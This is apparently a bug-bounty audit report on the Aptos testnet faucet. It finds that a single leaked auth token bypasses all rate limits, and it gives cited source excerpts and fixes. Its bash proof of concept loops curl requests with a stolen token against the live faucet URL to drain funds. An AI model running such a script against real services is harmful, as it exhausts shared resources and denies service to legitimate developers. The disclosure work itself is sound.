# Audit Report

## Title
Faucet Authentication Token Reuse Vulnerability Enables Unlimited Account Funding and Rate Limit Bypass

## Summary
The `faucet_auth_token` authentication mechanism in the Aptos faucet system lacks account-specific binding, allowing a single stolen or leaked token to fund unlimited different accounts while completely bypassing all rate limiting controls. This enables an attacker to drain testnet/devnet faucet funds and deny service to legitimate users.

## Finding Description

The Aptos faucet implements an authentication token system that allows privileged users to bypass rate limits. However, the token validation is implemented as a simple bearer token check with no binding to specific accounts or rate limiting on token usage itself.

**Attack Flow:**

1. **Token Storage & Transmission**: The CLI stores the token and sends it via the Authorization header: [1](#0-0) 

2. **Client-Side Token Usage**: The FaucetClient includes the token in every request without any account binding: [2](#0-1) 

3. **Server-Side Bypass Logic**: The AuthTokenBypasser performs a simple allowlist check without any account association: [3](#0-2) 

4. **Complete Rate Limit Bypass**: When a valid token is detected, ALL checkers (including rate limiters) are skipped entirely: [4](#0-3) 

5. **No Account-Specific Tracking**: Even in the completion phase, bypassed requests skip all checker logic: [5](#0-4) 

**Exploitation Scenario:**
```
1. Attacker obtains valid faucet_auth_token (via leak, theft, or compromise)
2. Attacker writes script to create 1000+ different account addresses
3. For each address, attacker sends: POST /fund with Authorization: Bearer <stolen_token>
4. Each request bypasses all rate limiters (RedisRatelimitChecker, MemoryRatelimitChecker)
5. Each request can fund up to maximum_amount_with_bypass (typically higher than normal limit)
6. Faucet funds are drained; legitimate developers cannot test their applications
```

The rate limiting mechanism tracks requests per-IP or per-JWT, but is completely bypassed when a valid auth token is present: [6](#0-5) 

## Impact Explanation

This vulnerability meets **Medium Severity** criteria per the Aptos bug bounty program for the following reasons:

1. **Limited Funds Loss**: While the faucet contains real testnet APT tokens, the impact is limited to testnet/devnet environments, not mainnet production funds. An attacker can drain the faucet balance, but this requires no privileged access and affects only test networks.

2. **Service Availability**: Draining the faucet denies service to legitimate developers who need testnet tokens for testing and development, disrupting the developer ecosystem.

3. **Resource Manipulation**: The vulnerability bypasses designed security controls (rate limits) intended to ensure fair resource distribution among users.

The impact is appropriately rated as Medium (not Critical or High) because:
- No mainnet funds are at risk
- No consensus or validator operations are affected  
- The faucet can be refilled by operators
- No permanent blockchain state corruption occurs

## Likelihood Explanation

**Likelihood: Medium to High**

The exploitation requires:
1. **Token Acquisition**: An attacker must obtain a valid `faucet_auth_token` through:
   - Leaked environment variables (FAUCET_AUTH_TOKEN)
   - Stolen configuration files containing tokens
   - Compromised CI/CD systems that use tokens for automated testing
   - Insider access or social engineering

2. **Exploitation Complexity**: Once a token is obtained, exploitation is trivial:
   - Simple HTTP POST requests to the faucet endpoint
   - No specialized tools or deep technical knowledge required
   - Can be automated with basic scripting

3. **Detection Difficulty**: The attack may go unnoticed because:
   - Bypassed requests don't trigger rate limit alerts
   - Logs show successful funding operations (appear legitimate)
   - No account-specific tracking exists to detect single token funding many accounts

Given that auth tokens are commonly shared in development teams, stored in configuration repositories, and used in CI/CD pipelines, the likelihood of token leakage is non-trivial.

## Recommendation

Implement multi-layered token security controls:

**1. Token-to-Account Binding**
```rust
pub struct AuthTokenBypasser {
    pub manager: ListManager,
    // Add account binding
    pub token_account_bindings: HashMap<String, Vec<AccountAddress>>,
}

impl BypasserTrait for AuthTokenBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        // Existing token check
        let auth_token = /* extract token */;
        if !self.manager.contains(auth_token) {
            return Ok(false);
        }
        
        // NEW: Verify token is authorized for this specific account
        if let Some(allowed_accounts) = self.token_account_bindings.get(auth_token) {
            if !allowed_accounts.is_empty() && !allowed_accounts.contains(&data.receiver) {
                return Ok(false);
            }
        }
        
        Ok(true)
    }
}
```

**2. Token Usage Rate Limiting**
Even bypassed requests should have per-token rate limits:
```rust
// Track usage per token
pub struct TokenUsageTracker {
    token_daily_limits: HashMap<String, (u32, Instant)>,
}

// Check token usage before bypassing
if let Some(usage) = self.token_usage.get(auth_token) {
    if usage.requests_today >= MAX_REQUESTS_PER_TOKEN_PER_DAY {
        return Ok(false);
    }
}
```

**3. Token Revocation Mechanism**
Implement real-time token revocation:
- Add token expiration timestamps
- Enable immediate token invalidation via admin API
- Rotate tokens periodically

**4. Enhanced Monitoring**
- Alert when single token funds more than N unique accounts per day
- Log token fingerprints (not full tokens) for audit trails
- Monitor for unusual funding patterns from bypassed requests

## Proof of Concept

```bash
#!/bin/bash
# PoC: Drain faucet using single stolen token

STOLEN_TOKEN="leaked-auth-token-abc123"
FAUCET_URL="https://faucet.testnet.aptoslabs.com"
AMOUNT=1000000000  # Maximum amount with bypass

# Generate 100 random account addresses
for i in {1..100}; do
    # Generate random account address (in practice, use proper key generation)
    ACCOUNT="0x$(openssl rand -hex 32)"
    
    echo "Funding account $i: $ACCOUNT"
    
    # Fund account with stolen token - bypasses ALL rate limits
    curl -X POST "$FAUCET_URL/fund" \
        -H "Authorization: Bearer $STOLEN_TOKEN" \
        -H "Content-Type: application/json" \
        -d "{
            \"address\": \"$ACCOUNT\",
            \"amount\": $AMOUNT
        }"
    
    echo ""
done

echo "Successfully funded 100 accounts, each with $AMOUNT octas"
echo "Total drained: $((AMOUNT * 100)) octas using single stolen token"
```

**Expected Result**: All 100 requests succeed without any rate limiting, demonstrating that:
1. A single token can fund unlimited different accounts
2. Per-IP rate limits are bypassed (same IP used for all requests)
3. Per-account rate limits don't exist
4. Token can be reused indefinitely

**To verify the vulnerability exists**, examine:
- The token is never checked against the receiving account address
- The `AuthTokenBypasser` returns true solely based on token presence in allowlist
- No counter or state is maintained for token usage across accounts

## Notes

This vulnerability is specific to the faucet service and does not affect:
- Mainnet operations (no faucet exists on mainnet)
- Consensus protocol security
- Validator operations
- On-chain smart contract execution

The issue is limited to testnet/devnet developer tooling but still represents a security control bypass that could disrupt the developer ecosystem and waste operational resources.

### Citations

**File:** crates/aptos/src/common/types.rs (L1662-1665)
```rust
    /// Auth token to bypass faucet ratelimits. You can also set this as an environment
    /// variable with FAUCET_AUTH_TOKEN.
    #[clap(long, env)]
    pub faucet_auth_token: Option<String>,
```

**File:** crates/aptos-rest-client/src/faucet.rs (L119-130)
```rust
    // Helper to carry out requests.
    async fn build_and_submit_request(&self, url: Url) -> Result<Response> {
        // build request
        let mut request = self.inner.post(url).header("content-length", 0);
        if let Some(token) = &self.token {
            request = request.header("Authorization", format!("Bearer {}", token));
        }

        // carry out and return response
        let response = request.send().await.map_err(FaucetClientError::request)?;
        Ok(response)
    }
```

**File:** crates/aptos-faucet/core/src/bypasser/auth_token.rs (L30-50)
```rust
#[async_trait]
impl BypasserTrait for AuthTokenBypasser {
    async fn request_can_bypass(&self, data: CheckerData) -> Result<bool> {
        // Don't check if the request has X_IS_JWT_HEADER set.
        if data.headers.contains_key(X_IS_JWT_HEADER) {
            return Ok(false);
        }

        let auth_token = match data
            .headers
            .get(AUTHORIZATION)
            .and_then(|v| v.to_str().ok())
            .and_then(|v| v.split_whitespace().nth(1))
        {
            Some(auth_token) => auth_token,
            None => return Ok(false),
        };

        Ok(self.manager.contains(auth_token))
    }
}
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L244-259)
```rust
        // See if this request meets the criteria to bypass checkers / storage.
        for bypasser in &self.bypassers {
            if bypasser
                .request_can_bypass(checker_data.clone())
                .await
                .map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::BypasserError)
                })?
            {
                info!(
                    "Allowing request from {} to bypass checks / storage",
                    source_ip
                );
                return Ok((checker_data, true, permit));
            }
        }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L332-347)
```rust
        if !bypass {
            let response_is_500 = match &fund_result {
                Ok(_) => false,
                Err(e) => e.error_code.status().is_server_error(),
            };
            let complete_data = CompleteData {
                checker_data,
                txn_hashes: txn_hashes.clone(),
                response_is_500,
            };
            for checker in &self.checkers {
                checker.complete(complete_data.clone()).await.map_err(|e| {
                    AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError)
                })?;
            }
        }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L224-260)
```rust
#[async_trait]
impl CheckerTrait for RedisRatelimitChecker {
    async fn check(
        &self,
        data: CheckerData,
        dry_run: bool,
    ) -> Result<Vec<RejectionReason>, AptosTapError> {
        let mut conn = self
            .get_redis_connection()
            .await
            .map_err(|e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::StorageError))?;

        // Generate a key corresponding to this identifier and the current day.
        let key_prefix = self.ratelimit_key_provider.ratelimit_key_prefix();
        let key_value = self
            .ratelimit_key_provider
            .ratelimit_key_value(&data)
            .await?;
        let (key, seconds_until_next_day) =
            self.get_key_and_secs_until_next_day(key_prefix, &key_value);

        // Get the value for the key, indicating how many non-500 requests we have
        // serviced for it today.
        let limit_value: Option<i64> = conn.get(&key).await.map_err(|e| {
            AptosTapError::new_with_error_code(
                format!("Failed to get value for redis key {}: {}", key, e),
                AptosTapErrorCode::StorageError,
            )
        })?;

        // If the limit value is greater than what we allow per day, signal that we
        // should reject this request.
        if let Some(rejection_reason) = self.check_limit_value(limit_value, seconds_until_next_day)
        {
            return Ok(vec![rejection_reason]);
        }

```
